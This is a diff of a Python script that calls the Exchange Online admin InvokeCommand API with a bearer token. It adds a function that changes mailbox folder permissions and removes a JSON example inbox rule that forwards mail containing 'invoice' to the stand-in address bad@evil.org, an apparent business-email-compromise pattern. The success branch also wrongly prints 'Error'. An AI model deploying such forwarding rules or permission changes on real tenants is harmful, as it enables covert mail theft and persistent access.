@@ -69,10 +69,35 @@ def create_rule_rest(tenant_id, params, token):
         print (response.text)    
     
 
+def modify_folder_permission_rest(tenant_id, params, token, command):
+
+    rest_endpoint = f'https://outlook.office365.com/adminapi/beta/{tenant_id}/InvokeCommand'
 
 
+    headers = {
+        'Authorization': f'Bearer {token}',
+        'Content-Type': 'application/json'
+    }
 
+    data = {
+    "CmdletInput": {
+        "CmdletName": command,
+        "Parameters": {
+            "AccessRights": params['access_rights'],
+            "User": params['user'],
+            "Identity": params['folder']
+            }
+        }
+    }
+    
+    response = requests.post(rest_endpoint, headers=headers, json=data)
 
+    if response.status_code == 201:
+        print ('Created!')
+        print(f'Error: {response.status_code}')
+        print (response.text)    
 
-
-{"CmdletInput":{"CmdletName":"New-InboxRule","Parameters":{"BodyContainsWords":"invoice","Name":"pws_rule","ForwardTo":["bad@evil.org"]}}}
+    else:
+        print(f'Error: {response.status_code}')
+        print (response.text)    
+    
